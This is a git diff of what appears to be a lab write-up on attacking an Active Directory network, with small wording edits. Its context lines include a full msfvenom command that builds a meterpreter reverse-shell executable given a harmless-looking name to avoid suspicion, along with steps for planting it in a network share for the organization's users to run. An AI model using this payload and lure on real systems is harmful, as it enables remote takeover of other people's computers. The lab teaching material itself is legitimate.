@@ -170,7 +170,7 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	where the option `-r disk:share=~/Desktop/share` allows to share the folder `share` between the Kali machine and the remote server, so we are able to easily move documents between the two devices.
  
  6. **Generate a payload for starting a reverse shell and inject it:**
-	In a *different* shell window, we now proceed generating an exploit through which we will try to inject a `meterpreter` reverse shell client to the computers of the organization.
+	In a *different* shell window, we now proceed generating an exploit whose payload is a `meterpreter` reverse shell client.
 	For doing so, we run the following command on the Kali machine to generate a payload that launches the reverse shell client:
 
     `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`
@@ -179,7 +179,7 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 
 	The output of the command execution is the file `WorkShiftsManager.exe` that we will find on the Kali's desktop: its name is deliberately misleading, since we want not to raise any suspicion.
 	
-	We now need to **inject** the exploit into the systems.
+	We now need to **inject** the exploit into the computers of the organization.
 	For doing so, we can rely on the remote desktop connection that we opened: we copy the executable file into the `share` folder and then, from the server's remote desktop, we copy the file into the network shared folder.
 	Doing so, all the account of the organization will be able to see (and execute) that file.
 	
@@ -252,7 +252,7 @@ Other useful information about Active Directory have been retrieved from officia
 
 [^2]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEzODg1MDI4MDksOTc3OTEyNTE2LDQ5Mj
+eyJoaXN0b3J5IjpbLTExODQxNjc0MzgsOTc3OTEyNTE2LDQ5Mj
 Y2NjQxNywtMTE5NTMwMjgzOCw2NDAwODkyOTksLTE3NDAxODc5
 NDEsLTEzNTE2OTYxMTgsNDg0MjU5MzAsLTE2NDc2ODc1OTIsMT
 A5OTkzMTc0MCwtMTI1MjU2MDcxNywxNDkyMjg2NjgzLDI4MDg0
